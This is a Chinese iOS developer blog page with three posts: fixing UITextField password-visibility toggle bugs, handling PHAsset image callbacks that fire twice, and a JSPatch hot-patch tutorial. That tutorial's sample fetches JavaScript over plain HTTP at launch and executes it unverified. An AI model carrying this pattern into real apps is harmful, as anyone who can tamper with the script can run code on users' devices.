<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#99;&#111;&#x64;&#x65;&#114;&#102;&#105;&#115;&#104;&#64;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;">&#99;&#111;&#x64;&#x65;&#114;&#102;&#105;&#115;&#104;&#64;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/03/25/iOS——密码明文:密文切换问题/" itemprop="url">
                  iOS——密码明文/密文切换问题
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-03-25T15:35:27+08:00" content="2016-03-25">
              2016-03-25
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/03/25/iOS——密码明文:密文切换问题/" class="leancloud_visitors" data-flag-title="iOS——密码明文/密文切换问题">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>前段时间根据产品经理的要求给我们输入密码的部分加了明文/密文切换，中间也遇到了一些颇有意思的问题。其中也有些很难查到资料。</p>
<p>在这里记录下来，也供大家参考，避免大家重复踩坑。</p>
<h1 id="情景描述"><a href="#情景描述" class="headerlink" title="情景描述"></a>情景描述</h1><p>明文/密文切换，就是输入密码的时候可以选择<code>明文显示</code>还是<code>**</code>这样的显示。</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-01.jpg-w375" alt=""></p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-02.jpg-w375" alt=""></p>
<p>右侧的按钮可以切换明文、密文模式</p>
<h1 id="UITextField明文-密文切换属性的属性"><a href="#UITextField明文-密文切换属性的属性" class="headerlink" title="UITextField明文\密文切换属性的属性"></a>UITextField明文\密文切换属性的属性</h1><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">getter</span>=isSecureTextEntry) <span class="built_in">BOOL</span> secureTextEntry;       <span class="comment">// default is NO</span></div></pre></td></tr></table></figure>
<h1 id="Q1：光标位置错乱"><a href="#Q1：光标位置错乱" class="headerlink" title="Q1：光标位置错乱"></a>Q1：光标位置错乱</h1><p>一般来说密文的时候*号要比字母更宽，当密文切换成明文的时候光标的位置居然没有变化，出现了这样的情况。<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%3A%E5%AF%86%E6%96%87%E5%88%87%E6%8D%A2%E9%97%AE%E9%A2%98-03.png-w375" alt="嗯 没有用我们自己的app了，写了个demo，样式很简约"></p>
<p>这个问题在查了一些资料之后发现可能是苹果自己的BUG，当然，对应方法是有的。我们可以在切换代码前将textfiled的enable设为NO，切换后在设置YES。当然，这回让textfiled退出编辑模式。</p>
<p>如果你有更好的方式，欢迎交流，或者在博文后留言😘<br><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">self</span>.tfPassword.enabled = <span class="literal">NO</span>;</div><div class="line"><span class="keyword">self</span>.tfPassword.secureTextEntry = !<span class="keyword">self</span>.tfPassword.secureTextEntry;</div><div class="line"><span class="keyword">self</span>.tfPassword.enabled = <span class="literal">YES</span>;</div></pre></td></tr></table></figure></p>
<h1 id="Q2：光标位置错乱"><a href="#Q2：光标位置错乱" class="headerlink" title="Q2：光标位置错乱"></a>Q2：光标位置错乱</h1><p>当UITextField经历 <code>明文-&gt;密文-&gt;明文</code> 时，再次输入，无论你输入什么，都会将所有输入清空。</p>
<p>嗯，这确实是个头疼的问题，也没有任何理由，因为UITextField本身如此，而且当时真的想不到任何办法。</p>
<p>最后终于解决。</p>
<p>思路是这样的：我们都只到UITextField的代理UITextFieldDelegate中有方法<code>- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string;</code> 相信每个人都会常用，通常我们用来抓用户输入的文字，在每次textfield发生字符改变的时候。</p>
<p>但是我们忽略了这个方法的本身作用，注意返回值，这个方法本身是用来返回<code>『是否允许改变textfield字符』</code>。</p>
<p>所以只要在这里做判断：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">BOOL</span>)textField:(<span class="built_in">UITextField</span> *)textField shouldChangeCharactersInRange:(<span class="built_in">NSRange</span>)range replacementString:(<span class="built_in">NSString</span> *)string &#123;</div><div class="line">    </div><div class="line">    <span class="comment">//string就是此时输入的那个字符</span></div><div class="line">    <span class="comment">//得到输入框的内容</span></div><div class="line">    <span class="built_in">NSString</span> * toBeString = [textField.text stringByReplacingCharactersInRange:range withString:string];</div><div class="line">    <span class="keyword">if</span> (textField == _tfPassword &amp;&amp; textField.isSecureTextEntry ) &#123;</div><div class="line">        textField.text = toBeString;</div><div class="line">        <span class="keyword">return</span> <span class="literal">NO</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完美解决</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>唔，这篇也给个代码吧，其实只有几行。<br><a href="http://download.csdn.net/detail/u010127917/9472703" target="_blank" rel="external">http://download.csdn.net/detail/u010127917/9472703</a></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其实很多奇怪的问题只有在实际开发的时候发现，这时候你就会认识到自己的经验不足。所以啦，学无止境~。</p>
<p>过段时间妹子我会奉上自己的照片哦~（好久没自拍啦~~😲）</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#99;&#111;&#100;&#x65;&#x72;&#102;&#105;&#115;&#x68;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#x6f;&#109;">&#99;&#111;&#100;&#x65;&#x72;&#102;&#105;&#115;&#x68;&#x40;&#49;&#x36;&#51;&#46;&#x63;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/03/05/iOS——iOS8-Photo库-PHAsset之坑/" itemprop="url">
                  iOS——iOS8 Photo库 PHAsset之坑
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-03-05T14:06:28+08:00" content="2016-03-05">
              2016-03-05
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/03/05/iOS——iOS8-Photo库-PHAsset之坑/" class="leancloud_visitors" data-flag-title="iOS——iOS8 Photo库 PHAsset之坑">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="问题重现"><a href="#问题重现" class="headerlink" title="问题重现"></a>问题重现</h1><p>最近在做项目的时候，我们选择了一个可以下载iClould图片的三方Picker——CTAssetsPickerController，这个Picker会根据不同系统版本，返回不同类型的图片资源。</p>
<p>iOS8之前，访问系统照片视频使用的是 AssetsLibrary 框架，iOS8之后有了新的系统框架PhotoKit，这一框架对iCloud选图有很好的支持。</p>
<p>AssetsLibrary的图片资源类型是ALAsset，而PhotoKit的图片资源类型是PHAsset。</p>
<p>如果通过PHAsset获取图片资源，可以调用以下方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[[PHImageManager defaultManager] requestImageForAsset:asset targetSize:<span class="built_in">CGSizeMake</span>(pixelWidth, pixelHeight) contentMode:PHImageContentModeAspectFit options:<span class="literal">nil</span> resultHandler:^(<span class="built_in">UIImage</span> * _Nullable result, <span class="built_in">NSDictionary</span> * _Nullable info) &#123;</div><div class="line">	<span class="comment">// 回调部分</span></div><div class="line">            </div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>但是这个方法有一个潜在的坑——<code>回调部分会被调两次</code>。</p>
<p>这里是该方法的官方注释：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// If the asset's aspect ratio does not match that of the given targetSize, contentMode determines how the image will be resized.</span></div><div class="line"><span class="comment">//      PHImageContentModeAspectFit: Fit the asked size by maintaining the aspect ratio, the delivered image may not necessarily be the asked targetSize (see PHImageRequestOptionsDeliveryMode and PHImageRequestOptionsResizeMode)</span></div><div class="line"><span class="comment">//      PHImageContentModeAspectFill: Fill the asked size, some portion of the content may be clipped, the delivered image may not necessarily be the asked targetSize (see PHImageRequestOptionsDeliveryMode &amp;&amp; PHImageRequestOptionsResizeMode)</span></div><div class="line"><span class="comment">//      PHImageContentModeDefault: Use PHImageContentModeDefault when size is PHImageManagerMaximumSize (though no scaling/cropping will be done on the result)</span></div><div class="line"><span class="comment">// If -[PHImageRequestOptions isSynchronous] returns NO (or options is nil), resultHandler may be called 1 or more times.</span></div><div class="line"><span class="comment">//     Typically in this case, resultHandler will be called asynchronously on the main thread with the requested results.</span></div><div class="line"><span class="comment">//     However, if deliveryMode = PHImageRequestOptionsDeliveryModeOpportunistic, resultHandler may be called synchronously on the calling thread if any image data is immediately available. If the image data returned in this first pass is of insufficient quality, resultHandler will be called again, asychronously on the main thread at a later time with the "correct" results.</span></div><div class="line"><span class="comment">//     If the request is cancelled, resultHandler may not be called at all.</span></div><div class="line"><span class="comment">// If -[PHImageRequestOptions isSynchronous] returns YES, resultHandler will be called exactly once, synchronously and on the calling thread. Synchronous requests cannot be cancelled. </span></div><div class="line"><span class="comment">// resultHandler for asynchronous requests, always called on main thread</span></div><div class="line"></div><div class="line">- (PHImageRequestID)requestImageForAsset:(PHAsset *)asset targetSize:(<span class="built_in">CGSize</span>)targetSize contentMode:(PHImageContentMode)contentMode options:(<span class="keyword">nullable</span> PHImageRequestOptions *)options resultHandler:(<span class="keyword">void</span> (^)(<span class="built_in">UIImage</span> *__<span class="keyword">nullable</span> result, <span class="built_in">NSDictionary</span> *__<span class="keyword">nullable</span> info))resultHandler;</div></pre></td></tr></table></figure>
<p>大意是：如果asset对应的资源不符合给定的尺寸，将由contentMode决定返回的图片如何压缩。<br>后面说到了回调可能被调用的次数，如果没有仔细看，你根本就搞不明白是怎么一回事。</p>
<p>stackoverflow上有人一语中的(<a href="http://stackoverflow.com/questions/26663258/uiimage-size-returned-from-requestimageforasset-is-not-even-close-to-the-targ" target="_blank" rel="external">原链接</a>)：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">This is because requestImageForAsset will be called twice.</div><div class="line"></div><div class="line">The first time, it will <span class="keyword">return</span> a very same size image, such as (<span class="number">60</span> * <span class="number">45</span>) which I think is the thumbnail of that image.</div><div class="line"></div><div class="line">The second time, you will get the full size image.</div><div class="line"></div><div class="line">I use</div><div class="line"></div><div class="line"><span class="keyword">if</span> ([[info valueForKey:<span class="string">@"PHImageResultIsDegradedKey"</span>]integerValue]==<span class="number">0</span>)&#123;</div><div class="line">    <span class="comment">// Do something with the FULL SIZED image</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// Do something with the regraded image</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">to distinguish the two different images.</div></pre></td></tr></table></figure>
<p>意思是因为该回调会被调用两次，第一次返回你指定尺寸的图片，第二次将会返回原尺寸图片<br>如果你想区分，可以这样使用：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ([[info valueForKey:<span class="string">@"PHImageResultIsDegradedKey"</span>]integerValue]==<span class="number">0</span>)&#123;</div><div class="line">    <span class="comment">// Do something with the FULL SIZED image</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// Do something with the regraded image</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="问题为什么是问题"><a href="#问题为什么是问题" class="headerlink" title="问题为什么是问题"></a>问题为什么是问题</h2><p>如果你不去注意这个地方，就可能和我一样去踩坑。<br>为什么这样说？在项目中，我们选中了一批图片，当我需要上传图片到我们的服务器时，需要将PHAsset换成UIImage。<br>当调用<code>- (PHImageRequestID)requestImageForAsset:(PHAsset *)asset targetSize:(CGSize)targetSize contentMode:(PHImageContentMode)contentMode options:(nullable PHImageRequestOptions *)options resultHandler:(void (^)(UIImage *__nullable result, NSDictionary *__nullable info))resultHandler;</code>并在回调中写入上传图片至服务器的代码。这时候，如果回调被调用了两次，就会导致同一张图片被上传两次。如果做了同图判断，就会不断的报出一张图片上传不成功，或者少传一张的情况。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>关于AssetsLibrary框架的坑，可以看<a href="http://kayosite.com/ios-development-and-detail-of-photo-framework.html/comment-page-1" target="_blank" rel="external">这篇文章</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x63;&#x6f;&#100;&#101;&#x72;&#x66;&#105;&#x73;&#x68;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;">&#x63;&#x6f;&#100;&#101;&#x72;&#x66;&#105;&#x73;&#x68;&#x40;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/01/16/iOS——为你的项目引入超轻量级JS引擎JSPatch/" itemprop="url">
                  iOS——为你的项目引入超轻量级JS引擎JSPatch
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-01-16T16:10:11+08:00" content="2016-01-16">
              2016-01-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/01/16/iOS——为你的项目引入超轻量级JS引擎JSPatch/" class="leancloud_visitors" data-flag-title="iOS——为你的项目引入超轻量级JS引擎JSPatch">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-JSPatch"><a href="#1-JSPatch" class="headerlink" title="1. JSPatch"></a>1. JSPatch</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JSPatch是由国内一位年轻帅气的大牛bang编写的极小的JS引擎文件</p>
<p>这个开源项目(<a href="http://jspatch.com" target="_blank" rel="external">主页</a>、<a href="https://github.com/bang590/JSPatch" target="_blank" rel="external">Github连接</a>)，让你只需要在项目里引入极小的引擎文件，就可以使用 JavaScript 调用任何 Objective-C 的原生接口，替换任意 Objective-C 原生方法。</p>
<p>我了解这个项目的原因是因为项目的大神率先用了这个Mini引擎解决了我们线上BUG的燃眉之急，当我去学习这个引擎的时候，我觉得我的移动编码观被震撼了，这绝对是有重大意义的项目，所以推荐给所有还不了解人</p>
<h2 id="JSPatch解决了什么问题"><a href="#JSPatch解决了什么问题" class="headerlink" title="JSPatch解决了什么问题"></a>JSPatch解决了什么问题</h2><p>JSPatch可以调用一段JS替换OC原生方法。而最关键的是JSPatch调用的JS不仅可以是本地的，还可以是网络请求来的。</p>
<p>试想一下，当你的项目已经上线了，用户反馈给你一堆BUG，作为一个优秀的程序员，你一定会第一时间修正BUG并且在一定修复量之后发布新的版本。但是问题是：你的用户不一定会更新新版本的app。</p>
<p>这里暴露了移动端的一个弊端：不能像服务器端一样实时发布，即使修复了BUG用户却可以不选择更新。</p>
<p>而JSPatch由于可以从网络请求JS替换你原本的代码，你可以在在服务器端设置一个借口获取一个JS文件，当你的项目出现问题是，你可以通过向JS文件中编写代码来实时修复你的BUG。所以JSPatch可以完美的实时修复线上bug。</p>
<h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>常规的两种：</p>
<ol>
<li><p>CocoaPods</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Your Podfile</div><div class="line">platform :ios, '6.0'</div><div class="line">pod 'JSPatch'</div></pre></td></tr></table></figure>
</li>
<li><p>手动导入<br> 简历JSPatch/目录，拖入：</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">JSEngine.m</div><div class="line">JSEngine.h</div><div class="line">JSPatch.js</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>非常简单，在<code>AppDelegate</code>的<code>didFinishLaunchingWithOptions</code>方法中加入JSPatch的初始化代码</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[JPEngine startEngine];</div><div class="line">    </div><div class="line"><span class="comment">// 导入本地存放的js</span></div><div class="line"><span class="built_in">NSString</span> *sourcePath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@"sample"</span> ofType:<span class="string">@"js"</span>];</div><div class="line"><span class="built_in">NSString</span> *script = [<span class="built_in">NSString</span> stringWithContentsOfFile:sourcePath encoding:<span class="built_in">NSUTF8StringEncoding</span> error:<span class="literal">nil</span>];</div><div class="line">[JPEngine evaluateScript:script];</div></pre></td></tr></table></figure>
<p>上面这些代码，是小鱼在本次演示中使用的，sourcePath指向的是项目中的sample.js（sample.js现在是空的）</p>
<p>除了上面我写的这种本地加载JS，更常用的是通过向服务器请求JS，JSPatch提供了非常全面的加载方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[JPEngine startEngine];</div><div class="line"></div><div class="line"><span class="comment">// 直接用NSString写一段JS</span></div><div class="line">[JPEngine evaluateScript:<span class="string">@"\</span></div><div class="line"> var alertView = require('UIAlertView').alloc().init();\</div><div class="line"> alertView.setTitle('Alert');\</div><div class="line"> alertView.setMessage('AlertView from js'); \</div><div class="line"> alertView.addButtonWithTitle('OK');\</div><div class="line"> alertView.show(); \</div><div class="line">"];</div><div class="line"></div><div class="line"><span class="comment">// 从网络请求JS</span></div><div class="line">[<span class="built_in">NSURLConnection</span> sendAsynchronousRequest:[<span class="built_in">NSURLRequest</span> requestWithURL:[<span class="built_in">NSURL</span> URLWithString:<span class="string">@"http://cnbang.net/test.js"</span>]] queue:[<span class="built_in">NSOperationQueue</span> mainQueue] completionHandler:^(<span class="built_in">NSURLResponse</span> *response, <span class="built_in">NSData</span> *data, <span class="built_in">NSError</span> *connectionError) &#123;</div><div class="line">    <span class="built_in">NSString</span> *script = [[<span class="built_in">NSString</span> alloc] initWithData:data encoding:<span class="built_in">NSUTF8StringEncoding</span>];</div><div class="line">    [JPEngine evaluateScript:script];</div><div class="line">&#125;];</div><div class="line"></div><div class="line"><span class="comment">// exec local js file</span></div><div class="line"><span class="built_in">NSString</span> *sourcePath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@"sample"</span> ofType:<span class="string">@"js"</span>];</div><div class="line"><span class="built_in">NSString</span> *script = [<span class="built_in">NSString</span> stringWithContentsOfFile:sourcePath encoding:<span class="built_in">NSUTF8StringEncoding</span> error:<span class="literal">nil</span>];</div><div class="line">[JPEngine evaluateScript:script];</div></pre></td></tr></table></figure>
<p>OK，继续，我们来写一段错误代码</p>
<ol>
<li>ViewController的Storyboard中拖入了一个UILabel，并且拖好线</li>
<li><p>给ViewController加一个数组</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 现在的属性有：</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>) <span class="keyword">IBOutlet</span> <span class="built_in">UILabel</span> *lblText;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *array;</div></pre></td></tr></table></figure>
</li>
<li><p>给数组加个懒加载</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">NSMutableArray</span> *)array &#123;</div><div class="line">  	 <span class="keyword">if</span> (_array == <span class="literal">nil</span>) &#123;</div><div class="line">   	    _array = [<span class="built_in">NSMutableArray</span> array];</div><div class="line">  	 &#125;</div><div class="line"> 	  <span class="keyword">return</span> _array;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>在viewDidLoad中这样写</p>
</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)viewDidLoad &#123;</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line">    </div><div class="line">    [<span class="keyword">self</span>.array addObject:<span class="string">@"first"</span>];</div><div class="line">    [<span class="keyword">self</span>.array addObject:<span class="string">@"second"</span>];</div><div class="line">    [<span class="keyword">self</span>.array addObject:<span class="string">@"third"</span>];</div><div class="line">    </div><div class="line">    [<span class="keyword">self</span> test];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)test &#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>, <span class="keyword">self</span>.array[<span class="number">3</span>]);</div><div class="line">    <span class="keyword">self</span>.lblText.text = <span class="keyword">self</span>.array[<span class="number">3</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>显然会出错是不是？毕竟数组中只有3个元素</p>
<p>OK，运行，然后程序崩了</p>
<p>我们尝试用JSPatch解决<br>现在我们原来空空如也的sample.js派上了用场，在里面写入</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">// sample.js</div><div class="line">defineClass('ViewController', &#123;</div><div class="line">            test: function() &#123;</div><div class="line">            // 获取数组中第一个元素</div><div class="line">            var content = self.array().objectAtIndex(0);</div><div class="line">            // 获取label控件</div><div class="line">            var label = self.lblText();</div><div class="line">            // 设置label控件的文字</div><div class="line">            label.setText(content);</div><div class="line">            </div><div class="line">            &#125;</div><div class="line">            &#125;);</div></pre></td></tr></table></figure>
<p>再运行，你会发现不会出错，页面中的Label显示了”first”字样</p>
<p>以上的JS起到的作用是：重新编写『ViewController』中的『test』方法</p>
<p>是不是非常简单，关于语法，在<a href="https://github.com/bang590/JSPatch/wiki/基础用法" target="_blank" rel="external">这里</a>查看JSPatch的wiki，不要害怕，都是非常易懂的，就算你没有学JS，妹子我觉得这是见过最良心的文档了，简单易读还是中文，bang帅哥棒棒的</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>想想一下，上面的问题，如果这时候你的项目已经上线了，所有用户浏览这个页面时都会崩溃，必须及时修复。Don’t worry，如果你已经预先在<code>AppDelegate</code>的<code>didFinishLaunchingWithOptions</code>中做了网络加载，你只需要去修改那段js，所有线上的用户问题都会被及时解决</p>
<h1 id="3-源码"><a href="#3-源码" class="headerlink" title="3. 源码"></a>3. 源码</h1><p>老规矩，这里奉上上面demo的<a href="http://download.csdn.net/detail/u010127917/9407227" target="_blank" rel="external">源码</a></p>
<hr>
